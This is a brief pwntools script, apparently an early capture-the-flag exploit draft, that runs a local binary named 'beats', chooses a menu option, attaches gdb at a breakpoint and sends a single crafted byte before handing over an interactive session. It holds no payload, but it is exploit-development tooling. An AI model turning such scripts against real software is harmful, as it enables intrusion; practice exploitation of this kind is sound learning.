from pwn import *

io = process("./beats")

io.sendlineafter("Your choice:","1")
gdb.attach(io,"b*0x4015c9")
io.sendlineafter("Beats:","\x19")
io.interactive()
